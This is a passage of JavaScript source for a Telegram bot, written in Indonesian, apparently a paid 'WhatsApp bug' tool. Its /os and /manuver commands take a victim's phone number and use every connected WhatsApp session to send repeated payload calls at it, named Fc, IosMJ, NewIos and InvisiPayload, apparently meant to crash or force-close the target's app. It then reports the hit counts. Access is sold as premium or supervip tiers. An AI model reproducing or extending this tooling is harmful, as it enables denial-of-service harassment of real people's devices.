╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/os (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Os ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await IosMJ(sock, jid);
        await IosMJ(sock, jid);
        await IosMJ(sock, jid);
        await NewIos(sock, jid);
        await NewIos(sock, jid);
        await NewIos(sock, jid);
        await NewIos(sock, jid);
        await IosMJ(sock, jid);
        
        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});
bot.onText(/\/manuver (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // Periksa apakah pengguna berada dalam cooldown
    const lastUsage = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil(
        (COOLDOWN_TIME - (now - lastUsage)) / 1000
      );
      return bot.sendMessage(
        chatId,
        `⚠️ Anda harus menunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`,
        { parse_mode: "Markdown" }
      );
    }

    // Tandai waktu terakhir pengguna menjalankan perintah
    cooldowns.set(userId, now);

    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
        { parse_mode: "Markdown" }
      );
    }

    const [targetNumber, ...messageWords] = match[1].split(" ");
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const statusMessage = await bot.sendMessage(
      chatId,
      `Mengirim Manuver ke ${formattedNumber} menggunakan ${sessions.size} bot...`
    );

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) {
          console.log(
            `Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`
          );
          await initializeWhatsAppConnections();
          continue;
        }

        await Fc(sock, jid);
        await InvisiPayload(sock, jid);
        await InvisiPayload(sock, jid);
        await Fc(sock, jid);

        successCount++;
      } catch (error) {
        failCount++;
      }
    }

    await bot.editMessageText(
      `╭─────────────────
│    *HASIL PENGIRIMAN*    
│────────────────
│ Target: ${formattedNumber}
│ Berhasil: ${successCount}
│ Gagal: ${failCount}
│ Total Bot: ${sessions.size}
╰─────────────────`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `Terjadi kesalahan: ${error.message}\nSilakan coba lagi.`
    );
  }
});

console.log("Bot telah dimulai...");
